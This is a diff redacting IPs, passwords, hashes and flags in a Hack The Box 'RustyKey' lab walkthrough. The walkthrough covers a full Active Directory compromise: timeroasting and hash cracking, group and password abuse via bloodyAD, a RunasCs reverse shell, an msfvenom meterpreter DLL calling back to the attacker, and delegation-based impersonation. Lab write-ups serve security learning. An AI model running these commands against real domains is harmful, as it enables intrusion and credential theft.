@@ -16,9 +16,9 @@ Author: [EmSec](https://app.hackthebox.com/users/962022)
 ## Enumeration
 ### Nmap
 ```bash
-└─$ sudo nmap -Pn -sC -sV 10.129.4.62  
+└─$ sudo nmap -Pn -sC -sV 10.129.xx.xx  
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-30 04:25 EDT
-Nmap scan report for 10.129.4.62
+Nmap scan report for 10.129.xx.xx
 Host is up (0.18s latency).
 Not shown: 982 closed tcp ports (reset)
 PORT      STATE    SERVICE       VERSION
@@ -59,22 +59,22 @@ Nmap done: 1 IP address (1 host up) scanned in 711.12 seconds
 
 Add these to `/etc/hosts` file:
 ```bash
-10.129.4.62     rustykey.htb dc.rustykey.htb
+10.129.xx.xx     rustykey.htb dc.rustykey.htb
 ```
 
 ### Enum users
 ```bash
-└─$ sudo crackmapexec smb 10.129.4.62 -u rr.parker -p '8#t5HE8L!W3A' --users 
-SMB         10.129.4.62     445    10.129.4.62      [*]  x64 (name:10.129.4.62) (domain:10.129.4.62) (signing:True) (SMBv1:False)
-SMB         10.129.4.62     445    10.129.4.62      [-] 10.129.4.62\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
+└─$ sudo crackmapexec smb 10.129.xx.xx -u rr.parker -p '8#t5HE8L!W3A' --users 
+SMB         10.129.xx.xx     445    10.129.xx.xx      [*]  x64 (name:10.129.xx.xx) (domain:10.129.xx.xx) (signing:True) (SMBv1:False)
+SMB         10.129.xx.xx     445    10.129.xx.xx      [-] 10.129.xx.xx\rr.parker:8#t5HE8L!W3A STATUS_NOT_SUPPORTED
 ```
 
 From the nmap result, we can see that is machine has kerberos service so we need to use kerberos authentication.
 
 ```bash
-└─$ sudo crackmapexec smb 10.129.4.62 -u rr.parker -p '8#t5HE8L!W3A' -k --users
-SMB         10.129.4.62     445    10.129.4.62      [*]  x64 (name:10.129.4.62) (domain:10.129.4.62) (signing:True) (SMBv1:False)
-SMB         10.129.4.62     445    10.129.4.62      [-] 10.129.4.62\rr.parker: KDC_ERR_WRONG_REALM
+└─$ sudo crackmapexec smb 10.129.xx.xx -u rr.parker -p '8#t5HE8L!W3A' -k --users
+SMB         10.129.xx.xx     445    10.129.xx.xx      [*]  x64 (name:10.129.xx.xx) (domain:10.129.xx.xx) (signing:True) (SMBv1:False)
+SMB         10.129.xx.xx     445    10.129.xx.xx      [-] 10.129.xx.xx\rr.parker: KDC_ERR_WRONG_REALM
 ```
 
 So we need to use the correct realm name by create a file `krb5.conf` in `/etc/krb5.conf` and add the following content:
@@ -121,7 +121,7 @@ SMB         dc.rustykey.htb 445    dc               backupadmin                 
 SMB         dc.rustykey.htb 445    dc               [*] Enumerated 11 local users: RUSTYKEY
 ```
 
-> Remember to `sudo rdate -n 10.129.4.62` to sync the time with the target machine incase of kerberos authentication failure by clock skew.
+> Remember to `sudo rdate -n 10.129.xx.xx` to sync the time with the target machine incase of kerberos authentication failure by clock skew.
 
 We got some users: `Administrator`, `Guest`, `krbtgt`, `rr.parker`, `mm.turner`, `bb.morgan`, `gg.anderson`, `dd.ali`, `ee.reed`, `nn.marcos`, `backupadmin`.
 
@@ -298,7 +298,7 @@ LDAP        dc.rustykey.htb 389    DC               backupadmin                 
 Now we gonna request **Ticket Granting Ticket** for `rr.parker` user.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.4.62 rustykey.htb/rr.parker:'8#t5HE8L!W3A'
+└─$ getTGT.py -dc-ip 10.129.xx.xx rustykey.htb/rr.parker:'8#t5HE8L!W3A'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in rr.parker.ccache
@@ -326,7 +326,7 @@ Now we can use BloodHound to enumerate the machine with kerberos authentication.
 
 ### BloodHound
 ```bash
-└─$ bloodhound-python -u 'rr.parker' -p '8#t5HE8L!W3A' -d rustykey.htb -c All -o bloodhound_results.json -ns 10.129.4.62
+└─$ bloodhound-python -u 'rr.parker' -p '8#t5HE8L!W3A' -d rustykey.htb -c All -o bloodhound_results.json -ns 10.129.xx.xx
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
 INFO: Found AD domain: rustykey.htb
 INFO: Getting TGT for user
@@ -466,25 +466,25 @@ LOW PRIVILEGE MODULES
 There is an option to use `timeroast`.
 
 ```bash
-└─$ sudo nxc smb 10.129.4.62 -M timeroast
-SMB         10.129.4.62     445    10.129.4.62      [*]  x64 (name:10.129.4.62) (domain:10.129.4.62) (signing:True) (SMBv1:False) (NTLM:False)
-TIMEROAST   10.129.4.62     445    10.129.4.62      [*] Starting Timeroasting...
-TIMEROAST   10.129.4.62     445    10.129.4.62      1000:$sntp-ms$43357735594320124394a208f54939a1$1c0111e900000000000a37d94c4f434cec0d3867ca407e75e1b8428bffbfcd0aec0d82098627c46aec0d82098628042b
-TIMEROAST   10.129.4.62     445    10.129.4.62      1103:$sntp-ms$c717212744ad7ef3e2e42704e5b75112$1c0111e900000000000a37da4c4f434cec0d3867cac1fc8fe1b8428bffbfcd0aec0d820a36ca0c28ec0d820a36ca4533
-TIMEROAST   10.129.4.62     445    10.129.4.62      1104:$sntp-ms$3a6005d926bc809127ee1fcec374452e$1c0111e900000000000a37da4c4f434cec0d3867c8b49aa6e1b8428bffbfcd0aec0d820a3893ac19ec0d820a3893f799
-TIMEROAST   10.129.4.62     445    10.129.4.62      1105:$sntp-ms$ea9d8581f2ceca3580f0322e23e811f3$1c0111e900000000000a37da4c4f434cec0d3867ca9d0635e1b8428bffbfcd0aec0d820a3a7bf46dec0d820a3a7c55bb
-TIMEROAST   10.129.4.62     445    10.129.4.62      1106:$sntp-ms$9dcadf13e60f14e13833fac3f6ec348b$1c0111e900000000000a37da4c4f434cec0d3867c8781b9ae1b8428bffbfcd0aec0d820a3c6fcc40ec0d820a3c6ffce8
-TIMEROAST   10.129.4.62     445    10.129.4.62      1107:$sntp-ms$1460538d571aa0029c84f3c4745d31cf$1c0111e900000000000a37da4c4f434cec0d3867c9d699d5e1b8428bffbfcd0aec0d820a3dce4dd6ec0d820a3dce7b22
-TIMEROAST   10.129.4.62     445    10.129.4.62      1118:$sntp-ms$cf47ad5c2ab4bb2fc718953418f366ad$1c0111e900000000000a37da4c4f434cec0d3867c911d798e1b8428bffbfcd0aec0d820a5101556aec0d820a5101896c
-TIMEROAST   10.129.4.62     445    10.129.4.62      1119:$sntp-ms$38aacb1658c3d08a261c971778b36abe$1c0111e900000000000a37da4c4f434cec0d3867caed1da5e1b8428bffbfcd0aec0d820a52dc966eec0d820a52dcd2d4
-TIMEROAST   10.129.4.62     445    10.129.4.62      1120:$sntp-ms$878e3b416631b0c3ec8e28782feaff28$1c0111e900000000000a37da4c4f434cec0d3867c85bb609e1b8428bffbfcd0aec0d820a5463caaaec0d820a5463f9a4
-TIMEROAST   10.129.4.62     445    10.129.4.62      1121:$sntp-ms$97c8fdb0d9d707ee7a2b60f6e9066b7a$1c0111e900000000000a37da4c4f434cec0d3867ca021c39e1b8428bffbfcd0aec0d820a560a236fec0d820a560a668b
-TIMEROAST   10.129.4.62     445    10.129.4.62      1122:$sntp-ms$c72afb480f1f634116f456a38b44a6b6$1c0111e900000000000a37da4c4f434cec0d3867c7b73083e1b8428bffbfcd0aec0d820a57964f62ec0d820a57968009
-TIMEROAST   10.129.4.62     445    10.129.4.62      1123:$sntp-ms$f9bc9df2b8f6534cc2c48f7c127b9f58$1c0111e900000000000a37da4c4f434cec0d3867c95bec8fe1b8428bffbfcd0aec0d820a593b0b6eec0d820a593b3a68
-TIMEROAST   10.129.4.62     445    10.129.4.62      1124:$sntp-ms$7f109ca40e0a541f5591024dc83c031d$1c0111e900000000000a37da4c4f434cec0d3867c6ee6edee1b8428bffbfcd0aec0d820a5ae62131ec0d820a5ae64e7e
-TIMEROAST   10.129.4.62     445    10.129.4.62      1125:$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$1c0111e900000000000a37da4c4f434cec0d3867c8aa087ce1b8428bffbfcd0aec0d820a5ca1bc7dec0d820a5ca1eb77
-TIMEROAST   10.129.4.62     445    10.129.4.62      1126:$sntp-ms$fc76bd81d715769bffd899535c3869f6$1c0111e900000000000a37da4c4f434cec0d3867ca449f6ce1b8428bffbfcd0aec0d820a5e3c51bfec0d820a5e3c80b9
-TIMEROAST   10.129.4.62     445    10.129.4.62      1127:$sntp-ms$0ae03774925da97f948b1da16fdde456$1c0111e900000000000a37da4c4f434cec0d3867c7f2e63ce1b8428bffbfcd0aec0d820a60032c04ec0d820a60035cab
+└─$ sudo nxc smb 10.129.xx.xx -M timeroast
+SMB         10.129.xx.xx     445    10.129.xx.xx      [*]  x64 (name:10.129.xx.xx) (domain:10.129.xx.xx) (signing:True) (SMBv1:False) (NTLM:False)
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      [*] Starting Timeroasting...
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1000:$sntp-ms$43357735594320124394a208f54939a1$1c0111e900000000000a37d94c4f434cec0d3867ca407e75e1b8428bffbfcd0aec0d82098627c46aec0d82098628042b
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1103:$sntp-ms$c717212744ad7ef3e2e42704e5b75112$1c0111e900000000000a37da4c4f434cec0d3867cac1fc8fe1b8428bffbfcd0aec0d820a36ca0c28ec0d820a36ca4533
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1104:$sntp-ms$3a6005d926bc809127ee1fcec374452e$1c0111e900000000000a37da4c4f434cec0d3867c8b49aa6e1b8428bffbfcd0aec0d820a3893ac19ec0d820a3893f799
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1105:$sntp-ms$ea9d8581f2ceca3580f0322e23e811f3$1c0111e900000000000a37da4c4f434cec0d3867ca9d0635e1b8428bffbfcd0aec0d820a3a7bf46dec0d820a3a7c55bb
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1106:$sntp-ms$9dcadf13e60f14e13833fac3f6ec348b$1c0111e900000000000a37da4c4f434cec0d3867c8781b9ae1b8428bffbfcd0aec0d820a3c6fcc40ec0d820a3c6ffce8
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1107:$sntp-ms$1460538d571aa0029c84f3c4745d31cf$1c0111e900000000000a37da4c4f434cec0d3867c9d699d5e1b8428bffbfcd0aec0d820a3dce4dd6ec0d820a3dce7b22
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1118:$sntp-ms$cf47ad5c2ab4bb2fc718953418f366ad$1c0111e900000000000a37da4c4f434cec0d3867c911d798e1b8428bffbfcd0aec0d820a5101556aec0d820a5101896c
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1119:$sntp-ms$38aacb1658c3d08a261c971778b36abe$1c0111e900000000000a37da4c4f434cec0d3867caed1da5e1b8428bffbfcd0aec0d820a52dc966eec0d820a52dcd2d4
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1120:$sntp-ms$878e3b416631b0c3ec8e28782feaff28$1c0111e900000000000a37da4c4f434cec0d3867c85bb609e1b8428bffbfcd0aec0d820a5463caaaec0d820a5463f9a4
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1121:$sntp-ms$97c8fdb0d9d707ee7a2b60f6e9066b7a$1c0111e900000000000a37da4c4f434cec0d3867ca021c39e1b8428bffbfcd0aec0d820a560a236fec0d820a560a668b
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1122:$sntp-ms$c72afb480f1f634116f456a38b44a6b6$1c0111e900000000000a37da4c4f434cec0d3867c7b73083e1b8428bffbfcd0aec0d820a57964f62ec0d820a57968009
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1123:$sntp-ms$f9bc9df2b8f6534cc2c48f7c127b9f58$1c0111e900000000000a37da4c4f434cec0d3867c95bec8fe1b8428bffbfcd0aec0d820a593b0b6eec0d820a593b3a68
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1124:$sntp-ms$7f109ca40e0a541f5591024dc83c031d$1c0111e900000000000a37da4c4f434cec0d3867c6ee6edee1b8428bffbfcd0aec0d820a5ae62131ec0d820a5ae64e7e
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1125:$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$<SNIP>
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1126:$sntp-ms$fc76bd81d715769bffd899535c3869f6$1c0111e900000000000a37da4c4f434cec0d3867ca449f6ce1b8428bffbfcd0aec0d820a5e3c51bfec0d820a5e3c80b9
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1127:$sntp-ms$0ae03774925da97f948b1da16fdde456$1c0111e900000000000a37da4c4f434cec0d3867c7f2e63ce1b8428bffbfcd0aec0d820a60032c04ec0d820a60035cab
 ```
 
 Grab a lot of hashes, it would take a while to crack them so we need to find the one that we need to crack. <br>
@@ -495,7 +495,7 @@ Grab a lot of hashes, it would take a while to crack them so we need to find the
 See that the `Object ID` of `IT-COMPUTER3` is `S-1-5-21-3316070415-896458127-4139322052-1125` and we check the result above, we see that the `1125` is the one we need to crack.
 
 ```bash
-TIMEROAST   10.129.4.62     445    10.129.4.62      1125:$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$1c0111e900000000000a37da4c4f434cec0d3867c8aa087ce1b8428bffbfcd0aec0d820a5ca1bc7dec0d820a5ca1eb77
+TIMEROAST   10.129.xx.xx     445    10.129.xx.xx      1125:$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$<SNIP>
 ```
 
 After searching for this hash, we found out this [article](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac) which is a good guide to crack the hash.
@@ -506,7 +506,7 @@ To able to crack this hash, we need to use `31300` mode which we can get it from
 
 ```bash
 └─$ cat timeroast_hash.txt
-$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$1c0111e900000000000a37da4c4f434cec0d3867c8aa087ce1b8428bffbfcd0aec0d820a5ca1bc7dec0d820a5ca1eb77
+$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$<SNIP>
 ```
 
 ```bash
@@ -544,7 +544,7 @@ Dang it, this kali does not has enough memory to crack but I think it will be ab
 
 ```bash
 └─$ cat timeroast_hash.txt
-1125:$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$1c0111e900000000000a37da4c4f434cec0d3867c8aa087ce1b8428bffbfcd0aec0d820a5ca1bc7dec0d820a5ca1eb77
+1125:$sntp-ms$d9c3037d703d2c2e4b35b2be8ea35597$<SNIP>
 ```
 
 ```bash
@@ -627,19 +627,19 @@ Fix with by using `latin-1` encoding for dictionary.
 
 ```bash
 └─$ python3 timecrack.py timeroast_hash.txt /usr/share/wordlists/rockyou.txt
-[+] Cracked RID 1125 password: Rusty88!
+[+] Cracked RID 1125 password: Rustyxxx
 
 1 passwords recovered.
 ```
 
 Boom, we got the passowrd for `IT-COMPUTER3` computer account. <br>
-&rarr; `IT-COMPUTER3$:Rusty88!`
+&rarr; `IT-COMPUTER3$:Rustyxxx`
 
 From the bloodhound result that we gather earlier, we just grab the `IT-COMPUTER3` computer account. Now we will leverage to **AddSelf** to `HELPDESK@RUSTYKEY.HTB` group. <br>
 Before adding, we need to request **Ticket Granting Ticket** for `IT-COMPUTER3` computer account.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.4.62 'rustykey.htb/IT-COMPUTER3$:Rusty88!'
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'rustykey.htb/IT-COMPUTER3$:Rustyxxx'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in IT-COMPUTER3$.ccache
@@ -654,7 +654,7 @@ Activate the ticket.
 Let's add it.
 
 ```bash
-└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember 'HELPDESK' 'IT-COMPUTER3$'
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rustyxxx' add groupMember 'HELPDESK' 'IT-COMPUTER3$'
 [+] IT-COMPUTER3$ added to HELPDESK
 ```
 
@@ -670,26 +670,26 @@ Here is the [refs](https://learn.microsoft.com/en-us/previous-versions/windows/i
 Let's remove this group `PROTECTED OBJECTS@RUSTYKEY.HTB` out of two other group.
 
 ```bash
-└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember 'Protected Objects' 'IT'
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rustyxxx' remove groupMember 'Protected Objects' 'IT'
 [-] IT removed from Protected Objects
 ```
 
 We can able to modify `BB.MORGAN` and `GG.ANDERSON` password.
 
 ```bash
-└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password bb.morgan 'Password@123'      
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rustyxxx' set password bb.morgan 'Password@123'      
 [+] Password changed successfully!
 ```
 
 ```bash
-└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password gg.anderson 'Password@123'
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rustyxxx' set password gg.anderson 'Password@123'
 [+] Password changed successfully!
 ```
 
 Now let's request **Ticket Granting Ticket** for `BB.MORGAN` and `GG.ANDERSON` user.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.66.206 'rustykey.htb/gg.anderson:Password@123'
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'rustykey.htb/gg.anderson:Password@123'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
@@ -699,7 +699,7 @@ For `GG.ANDERSON` user, we got error due to `KDC_ERR_CLIENT_REVOKED` which means
 &rarr; We gonna move on to `BB.MORGAN` user.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.4.62 'rustykey.htb/bb.morgan:Password@123'    
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'rustykey.htb/bb.morgan:Password@123'    
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in bb.morgan.ccache
@@ -774,7 +774,7 @@ Warning: User is not needed for Kerberos auth. Ticket will be used
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\bb.morgan\Documents> cd ..\Desktop
 *Evil-WinRM* PS C:\Users\bb.morgan\Desktop> type user.txt
-6377177a0406b0bf0e2b107786184d78
+637717xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Able to access `bb.morgan` user and grab the `user.txt` flag.
@@ -823,14 +823,14 @@ To do that, we need to recall back the `IT-COMPUTER3` ticket.
 Redo this adding.
 
 ```bash
-└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' add groupMember 'HELPDESK' 'IT-COMPUTER3$'
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rustyxxx' add groupMember 'HELPDESK' 'IT-COMPUTER3$'
 [+] IT-COMPUTER3$ added to HELPDESK
 ```
 
 Remove the `protected objects@rustykey.htb` out of `support-team@rustykey.htb` group.
 
 ```bash
-└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' remove groupMember "CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB" "SUPPORT"
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rustyxxx' remove groupMember "CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB" "SUPPORT"
 [-] SUPPORT removed from CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB
 ```
 
@@ -839,14 +839,14 @@ Remove the `protected objects@rustykey.htb` out of `support-team@rustykey.htb` g
 Then reset the password of `ee.reed` user.
 
 ```bash
-└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rusty88!' set password ee.reed 'P@ssword123'                                             
+└─$ bloodyAD --host dc.rustykey.htb -d rustykey.htb -k -u 'IT-COMPUTER3$' -p 'Rustyxxx' set password ee.reed 'P@ssword123'                                             
 [+] Password changed successfully!
 ```
 
 Let's grab the `ee.reed` ticket and activate it to connect via evil-winrm.
 
 ```bash
-└─$ getTGT.py -dc-ip 10.129.4.62 'rustykey.htb/ee.reed:P@ssword123' 
+└─$ getTGT.py -dc-ip 10.129.xx.xx 'rustykey.htb/ee.reed:P@ssword123' 
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [*] Saving ticket in ee.reed.ccache
@@ -921,7 +921,7 @@ listening on [any] 3333 ...
 ```
 
 ```powershell
-*Evil-WinRM* PS C:\Temp> .\RunasCs.exe ee.reed P@ssword123 cmd.exe -r 10.10.14.59:3333
+*Evil-WinRM* PS C:\Temp> .\RunasCs.exe ee.reed P@ssword123 cmd.exe -r 10.xx.xx.xx:3333
 [*] Warning: User profile directory for user ee.reed does not exists. Use --force-profile if you want to force the creation.
 [*] Warning: The logon for user 'ee.reed' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
 
@@ -933,7 +933,7 @@ listening on [any] 3333 ...
 ```bash
 └─$ rlwrap -cAr nc -lvnp 3333
 listening on [any] 3333 ...
-connect to [10.10.14.59] from (UNKNOWN) [10.129.4.62] 49600
+connect to [10.xx.xx.xx] from (UNKNOWN) [10.129.xx.xx] 49600
 Microsoft Windows [Version 10.0.17763.7434]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -1300,7 +1300,7 @@ This is one of the attack vector from [T1546.015](https://attack.mitre.org/techn
 Let's create a malicious **DLL** file with [msfvenom](https://github.com/ParrotSec/metasploit-framework/blob/master/msfvenom).
 
 ```bash
-└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.59 LPORT=2222 -f dll -o info.dll
+└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.xx.xx.xx LPORT=2222 -f dll -o info.dll
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
@@ -1317,12 +1317,12 @@ msf6 > use exploit/multi/handler
 [*] Using configured payload generic/shell_reverse_tcp
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
 payload => windows/x64/meterpreter/reverse_tcp
-msf6 exploit(multi/handler) > set LHOST 10.10.14.59
-LHOST => 10.10.14.59
+msf6 exploit(multi/handler) > set LHOST 10.xx.xx.xx
+LHOST => 10.xx.xx.xx
 msf6 exploit(multi/handler) > set LPORT 2222
 LPORT => 2222
 msf6 exploit(multi/handler) > exploit
-[*] Started reverse TCP handler on 10.10.14.59:2222
+[*] Started reverse TCP handler on 10.xx.xx.xx:2222
 ```
 
 Upload the `info.dll` to the `C:\Temp` folder.
@@ -1358,9 +1358,9 @@ Wait for a second, fact that need to wait for a while to get the `meterpreter` s
 
 ```bash
 msf6 exploit(multi/handler) > exploit
-[*] Started reverse TCP handler on 10.10.14.59:2222 
-[*] Sending stage (203846 bytes) to 10.129.4.62
-[*] Meterpreter session 1 opened (10.10.14.59:2222 -> 10.129.4.62:53105) at 2025-07-01 08:27:11 -0400
+[*] Started reverse TCP handler on 10.xx.xx.xx:2222 
+[*] Sending stage (203846 bytes) to 10.129.xx.xx
+[*] Meterpreter session 1 opened (10.xx.xx.xx:2222 -> 10.129.xx.xx:53105) at 2025-07-01 08:27:11 -0400
 
 meterpreter > shell
 Process 14240 created.
@@ -1420,7 +1420,7 @@ Now `IT-Computer3` is allowed to impersonate any user when accessing resources o
 &rarr; We gonna do it with `backupadmin` user.
 
 ```bash
-└─$ getST.py -spn 'cifs/DC.RUSTYKEY.HTB' -impersonate backupadmin -dc-ip 10.129.4.62 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
+└─$ getST.py -spn 'cifs/DC.RUSTYKEY.HTB' -impersonate backupadmin -dc-ip 10.129.xx.xx -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rustyxxx'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] CCache file is not found. Skipping...
@@ -1442,7 +1442,7 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 We can use the from [impacket-getST](https://github.com/paranoidninja/Pandoras-Box/blob/master/python/impacket-scripts/getST.py) to get the ticket.
 
 ```bash
-└─$ impacket-getST -spn 'cifs/DC.RUSTYKEY.HTB' -impersonate backupadmin -dc-ip 10.129.4.62 -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rusty88!'
+└─$ impacket-getST -spn 'cifs/DC.RUSTYKEY.HTB' -impersonate backupadmin -dc-ip 10.129.xx.xx -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rustyxxx'
 Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 
 [-] CCache file is not found. Skipping...
@@ -1484,7 +1484,7 @@ C:\Users\Administrator\Desktop>dir
                2 Dir(s)   2,799,710,208 bytes free
 
 C:\Users\Administrator\Desktop>type root.txt
-b46d79aa99ba745b343e874e675ae129
+b46d79xxxxxxxxxxxxxxxxxxxxxxxxxx
 ```
 
 Nailed the `root.txt` flag.
